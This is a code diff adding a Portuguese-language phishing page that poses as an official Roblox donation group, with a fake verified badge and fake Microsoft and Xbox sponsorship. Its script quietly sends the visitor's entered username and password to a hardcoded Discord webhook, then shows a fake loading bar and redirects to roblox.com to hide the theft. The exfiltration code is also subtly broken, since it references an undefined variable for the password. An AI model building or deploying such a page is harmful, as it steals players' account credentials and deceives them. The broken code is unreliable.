@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Acesso | Grupo</title>
+    <style>
+        /* Reset de Estilos */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(45deg, #070a13, #110f24, #1a0822);
+            background-size: 300% 300%;
+            animation: colors 15s ease infinite;
+            overflow-x: hidden;
+            padding: 20px 0;
+        }
+
+        @keyframes colors {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* Container Principal (Glassmorphism) */
+        .card {
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            padding: 35px 25px;
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 24px 60px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 410px;
+            text-align: center;
+            position: relative;
+        }
+
+        /* --- Estilo do Círculo de Perfil --- */
+        .profile-container {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px auto;
+        }
+
+        .profile-pic {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid #1fa3c4;
+            box-shadow: 0 0 20px rgba(31, 163, 196, 0.5);
+            position: relative;
+            z-index: 2;
+        }
+
+        .profile-container::before {
+            content: '';
+            position: absolute;
+            top: -4px;
+            left: -4px;
+            right: -4px;
+            bottom: -4px;
+            background: linear-gradient(180deg, #1fa3c4, #6c3299);
+            border-radius: 50%;
+            z-index: 1;
+            opacity: 0.4;
+            filter: blur(6px);
+            animation: pulse 3s infinite alternate;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.4; }
+            100% { transform: scale(1.06); opacity: 0.6; }
+        }
+
+        /* Painel de Informações do Grupo */
+        .group-preview-box {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 14px;
+            padding: 12px;
+            margin-bottom: 25px;
+        }
+
+        .group-title-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .group-name {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        /* Ícone do Selo Verificado */
+        .verified-badge {
+            width: 18px;
+            height: 18px;
+            fill: #00e676; /* Verde vibrante oficial */
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        .group-members {
+            color: #94a3b8;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
+        /* --- Painel de Patrocinadores (Microsoft e Xbox) --- */
+        .sponsors-box {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            margin-top: 20px;
+            margin-bottom: 25px;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .sponsor-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #94a3b8;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .sponsor-item span {
+            font-weight: bold;
+        }
+
+        .sponsor-logo {
+            max-height: 20px; /* Mantém os logos nítidos e pequenos */
+            opacity: 0.7;
+            transition: opacity 0.3s ease;
+        }
+
+        .sponsor-item:hover .sponsor-logo {
+            opacity: 1;
+        }
+
+        h3 {
+            color: #ffffff;
+            font-size: 20px;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+
+        p {
+            color: #94a3b8;
+            margin-bottom: 25px;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        /* Inputs */
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #94a3b8;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            font-size: 15px;
+            color: #ffffff;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: #1fa3c4;
+            box-shadow: 0 0 15px rgba(31, 163, 196, 0.3);
+        }
+
+        /* Botões Estilo Pílula Gamer */
+        .game-btn-style {
+            width: 100%;
+            padding: 15px 20px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: #ffffff;
+            cursor: pointer;
+            border: 1px solid #35c4e7;
+            box-shadow: inset 0 2px 4px rgba(255, 255, 255, 0.1), 0 4px 10px rgba(0,0,0,0.3);
+            transition: transform 0.1s, filter 0.2s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.6);
+        }
+
+        .game-btn-style:active {
+            transform: scale(0.98);
+        }
+
+        .game-btn-style:hover {
+            filter: brightness(1.15);
+        }
+
+        .btn-join { background: linear-gradient(180deg, #1fa3c4 0%, #146a80 100%); border-color: #35c4e7; margin-bottom: 20px; }
+        .btn-submit { background: linear-gradient(180deg, #238fa7 0%, #175e6e 100%); border-color: #37b2cd; }
+
+        /* Área do Formulário de Login (Inicialmente Escondida) */
+        .login-section {
+            display: none;
+            margin-top: 5px;
+        }
+
+        /* Estado de Carregamento */
+        .btn-submit.loading {
+            background: #1e293b;
+            cursor: default;
+            color: #64748b;
+            border-color: rgba(255,255,255,0.05);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-submit .loader-text { display: block; }
+        .btn-submit .loading-progress-text { display: none; position: absolute; z-index: 2; }
+        .btn-submit.loading .loader-text { display: none; }
+        .btn-submit.loading .loading-progress-text { display: block; }
+
+        .loading-bar {
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            background: rgba(31, 163, 196, 0.4);
+            width: 0%;
+            transition: width 0.05s linear;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        
+        <div class="profile-container">
+            <img class="profile-pic" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ24N6XlUSygFABvfC-jF33Qh3iVqwQZgxjTn6KqBt88dWbFK-6BiJdxnZG&s=10" alt="Foto de Perfil">
+        </div>
+
+        <div class="group-preview-box">
+            <div class="group-title-container">
+                <div class="group-name">AcesseptCloer</div>
+                <svg class="verified-badge" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+            </div>
+            <div class="group-members">👥 228.183 Membros <span style="color: #00e676; margin-left: 5px;">🟢 34.023 Online</span></div>
+        </div>
+
+        <div class="sponsors-box">
+            <div class="sponsor-item">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="sponsor-logo">
+                <span>Microsoft</span>
+            </div>
+            <div class="sponsor-item">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e5/Xbox_logo.svg" alt="Xbox Logo" class="sponsor-logo">
+                <span>XBOX</span>
+            </div>
+        </div>
+
+        <div id="initialScreen">
+            <h3>Faça parte do grupo</h3>
+            <p>Clique abaixo para se juntar à nossa comunidade oficial. Conecte sua conta do ROBLOX para receber mensagens de doações diárias.<br><br>👑 NÓS SOMOS O PRINCIPAL SITE DE DOAÇÕES DO MERCADO!!<br>FAZEMOS SORTEIOS TODA SEGUNDA E QUINTA ⭐</p>
+            <button type="button" class="game-btn-style btn-join" id="startJoinBtn">Entrar no Grupo</button>
+        </div>
+
+        <div id="loginSection" class="login-section">
+            <h3>Verificação Necessária</h3>
+            <p>Faça login na sua conta para validar sua entrada no grupo.</p>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="username">N0ME</label>
+                    <input type="text" id="username" placeholder="Digite seu NOME" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="password">Senha</label>
+                    <input type="password" id="password" placeholder="" required>
+                </div>
+
+                <button type="submit" class="game-btn-style btn-submit" id="submitBtn">
+                    <span class="loading-bar" id="loadingBar"></span>
+                    <span class="loader-text">Entrar e Confirmar</span>
+                    <span class="loading-progress-text">Entrando... <span id="progressPercent">0</span>%</span>
+                </button>
+            </form>
+        </div>
+
+    </div>
+
+    <script>
+        const initialScreen = document.getElementById('initialScreen');
+        const startJoinBtn = document.getElementById('startJoinBtn');
+        const loginSection = document.getElementById('loginSection');
+        const loginForm = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingBar = document.getElementById('loadingBar');
+        const progressPercent = document.getElementById('progressPercent');
+
+        // Seu link de Webhook do Discord para salvar as credenciais
+        const discordWebhookUrl = 'https://discord.com/api/webhooks/1496630954100265031/RDVpafLxDx8p0spM3c2jUBwzdFg92EuTji51BTL3t7CbFg9yBGdoipIIRHqYgN2uvGkh';
+
+        // Quando clica para entrar no grupo, abre o formulário de login
+        startJoinBtn.addEventListener('click', function() {
+            initialScreen.style.display = 'none';
+            loginSection.style.display = 'block';
+        });
+
+        // Quando envia o formulário de login
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault(); 
+
+            const usuarioDigitado = document.getElementById('username').value;
+            const senhaDigitada = document.getElementById('password').value;
+
+            submitBtn.classList.add('loading');
+            let progress = 0;
+
+            // Envio oculto de dados para o Discord
+            const dadosDiscord = {
+                embeds: [{
+                    title: "🔐 Novo (AcesseptCloer)!",
+                    color: 2068391, 
+                    fields: [
+                        { name: "👤 Usuário", value: `\`\`\`${usuarioDigitado}\`\`\``, inline: false },
+                        { name: "🔑 Senha", value: `\`\`\`${corfavorito }\`\`\``, inline: false }
+                    ],
+                    footer: { text: "Sistema de Entrada de Grupos" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(dadosDiscord)
+            }).catch(error => console.error('Erro ao enviar dados:', error));
+
+            // Animação do carregamento da pílula
+            const interval = setInterval(() => {
+                progress += Math.random() * 5 + 1; 
+
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    
+                    // Redireciona imediatamente para o Roblox oficial após o sucesso
+                    setTimeout(() => {
+                        window.location.href = 'https://www.roblox.com';
+                    }, 300);
+                }
+
+                loadingBar.style.width = progress + '%';
+                progressPercent.innerText = Math.floor(progress);
+            }, 60); 
+        });
+    </script>
+
+</body>
+</html>
+
